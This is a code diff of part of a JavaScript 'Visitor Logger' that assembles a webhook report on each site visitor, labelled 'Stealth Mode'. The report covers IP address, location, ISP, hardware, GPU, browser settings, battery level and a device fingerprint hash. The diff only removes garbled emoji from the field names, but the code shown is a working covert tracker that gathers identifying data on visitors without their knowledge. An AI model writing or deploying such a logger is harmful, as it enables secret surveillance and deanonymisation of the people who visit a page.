@@ -109,66 +109,66 @@
 
       detectAdBlock(adBlocked => {
         const payload = {
-          username: "ðŸ“¡ Visitor Logger",
+          username: "Visitor Logger",
           avatar_url: "https://i.imgur.com/2xVfCiq.png",
           embeds: [{
-            title: "ðŸ” Visitor Intel Report",
+            title: "Visitor Intel Report",
             color: 0x00b0f4,
             description: `**IP Address:** \`${ip}\``,
             fields: [
               {
-                name: "ðŸ“ Location",
+                name: "Location",
                 value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}`,
                 inline: true
               },
               {
-                name: "ðŸŒ Network",
+                name: "Network",
                 value: `**ISP:** ${isp || "Unknown"}\n**Timezone:** ${timezone}\n**Connection:** ${connection}`,
                 inline: true
               },
               {
-                name: "ðŸ§  System",
+                name: "System",
                 value: `**Type:** ${deviceType}\n**Platform:** ${platform}\n**CPU Threads:** ${concurrency}\n**RAM:** ${memory} GB`,
                 inline: true
               },
               {
-                name: "ðŸ–¥ï¸ Display & GPU",
+                name: "Display & GPU",
                 value: `**Resolution:** ${screenSize} @ ${colorDepth}bit\n**Window:** ${windowSize}\n**Touch:** ${touchSupport}\n**Orientation:** ${orientation}`,
                 inline: true
               },
               {
-                name: "ðŸŽ® GPU Details",
+                name: "GPU Details",
                 value: `**Renderer:** ${gpu.renderer}\n**Vendor:** ${gpu.vendor}`,
                 inline: true
               },
               {
-                name: "ðŸ§© Browser",
+                name: "Browser",
                 value: `**Browser:** ${browser}\n**Engine:** ${engine}\n**Lang:** ${language}\n**Cookies:** ${cookies}\n**Java:** ${java}\n**DNT:** ${dnt}`,
                 inline: true
               },
               {
-                name: "ðŸŒ™ Preferences",
+                name: "Preferences",
                 value: `**Theme:** ${prefersDark}\n**Battery:** ${batteryLevel}\n**AdBlock:** ${adBlocked}\n**Fonts Loaded:** ${fontCount}`,
                 inline: true
               },
               {
-                name: "ðŸ§¬ Fingerprint",
+                name: "Fingerprint",
                 value: `\`${fingerprint.slice(0, 40)}...\` _(SHA-256 hash)_`,
                 inline: false
               },
               {
-                name: "ðŸ“„ Page Title",
+                name: "Page Title",
                 value: pageTitle || "Unknown",
                 inline: false
               },
               {
-                name: "ðŸ•’ Time of Visit",
+                name: "Time of Visit",
                 value: time,
                 inline: false
               }
             ],
             footer: {
-              text: "Visitor Logger â€¢ Stealth Mode",
+              text: "Visitor Logger - Stealth Mode",
               icon_url: "https://i.imgur.com/vyFjK0z.png"
             },
             timestamp: new Date().toISOString()
